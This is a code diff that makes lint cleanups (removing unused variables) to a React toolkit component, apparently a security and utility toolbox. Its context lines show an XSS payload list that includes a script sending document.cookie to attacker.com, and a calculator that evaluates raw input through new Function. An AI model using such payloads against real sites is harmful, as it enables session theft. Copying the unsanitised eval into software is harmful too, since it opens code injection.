@@ -130,9 +130,6 @@ const Toolkit: React.FC = () => {
   const [fileOutput, setFileOutput] = useState<string>('');
   const fileInputRef = useRef<HTMLInputElement>(null);
 
-  const filteredTools = (category: string) =>
-    tools.filter(t => t.category === category);
-
   const openTool = (tool: Tool) => {
     setSelectedTool(tool);
     setOutput('');
@@ -170,6 +167,7 @@ const Toolkit: React.FC = () => {
             ``,
             `[DOM BASED]`,
             `"><script>document.location='http://attacker.com?c='+document.cookie</script>`,
+            // eslint-disable-next-line no-script-url
             `javascript:alert(document.domain)`,
             ``,
             `[FILTER BYPASS]`,
@@ -339,7 +337,7 @@ const Toolkit: React.FC = () => {
           // MD5 via simple implementation
           const md5 = await (async () => {
             // Simple MD5 — browser fallback (not crypto.subtle supported)
-            let i, x, k;
+            let i;
             const S = [7,12,17,22,7,12,17,22,7,12,17,22,7,12,17,22,5,9,14,20,5,9,14,20,5,9,14,20,5,9,14,20,4,11,16,23,4,11,16,23,4,11,16,23,4,11,16,23,6,10,15,21,6,10,15,21,6,10,15,21,6,10,15,21];
             const K: number[] = [];
             for (i = 0; i < 64; i++) K.push(Math.floor(Math.abs(Math.sin(i + 1)) * 4294967296));
@@ -1021,10 +1019,8 @@ const Toolkit: React.FC = () => {
           const sp = speedStr.match(/([\d.]+)\s*(Mbps|Gbps|MBps|GBps|KBps)/i);
           if (!sm || !sp) { result = 'Format: 10 GB :: 100 Mbps'; break; }
           const sizeMap: Record<string, number> = { kb: 1e3, mb: 1e6, gb: 1e9, tb: 1e12 };
-          const spMap: Record<string, number>   = { kbps: 1e3/8, mbps: 1e6/8, gbps: 1e9/8, mbps2: 1e6, gbps2: 1e9 };
           const bytes = parseFloat(sm[1]) * (sizeMap[sm[2].toLowerCase()] || 1);
           const speedUnit = sp[2].toLowerCase();
-          const bytesPerSec = parseFloat(sp[1]) * (speedUnit.endsWith('bps') && !speedUnit.startsWith('m') && speedUnit !== 'mbps' && speedUnit !== 'gbps' && speedUnit !== 'kbps' ? 1 : speedUnit === 'mbps' ? 1e6/8 : speedUnit === 'gbps' ? 1e9/8 : speedUnit === 'mbps2' ? 1e6 : speedUnit === 'gbps2' ? 1e9 : speedUnit === 'kbps' ? 1e3/8 : 1);
           const realBps = parseFloat(sp[1]) * (speedUnit === 'gbps' ? 1e9/8 : speedUnit === 'mbps' ? 1e6/8 : speedUnit === 'kbps' ? 1e3/8 : speedUnit === 'gbps2' ? 1e9 : speedUnit === 'mbps2' ? 1e6 : 1e3);
           const secs = bytes / realBps;
           const h = Math.floor(secs / 3600), mn = Math.floor((secs % 3600) / 60), s2 = Math.floor(secs % 60);
@@ -1153,8 +1149,6 @@ const Toolkit: React.FC = () => {
         case 'calculator': {
           // Safe eval via Function
           try {
-            // Allow Math and basic expressions
-            const expr = raw.replace(/[^0-9+\-*/().\s%^&|~<>!MathsqrtpowloghexfloabsPIEabcdeino]/g, '');
             // eslint-disable-next-line no-new-func
             const res = new Function(`"use strict"; const {sqrt,pow,log,log2,log10,abs,floor,ceil,round,sin,cos,tan,PI,E,max,min} = Math; return (${raw});`)();
             result = `Expression: ${raw}\nResult: ${res}`;
@@ -1172,7 +1166,6 @@ const Toolkit: React.FC = () => {
             result = 'Format: PATTERN::FLAGS::TEST_STRING\nExample: \\d+::g::abc 123 def 456';
             break;
           }
-          const rx = new RegExp(pattern, flags || 'g');
           const matches: RegExpExecArray[] = [];
           let rxMatch: RegExpExecArray | null;
           const rxGlobal = new RegExp(pattern, (flags || 'g').includes('g') ? flags || 'g' : (flags || '') + 'g');
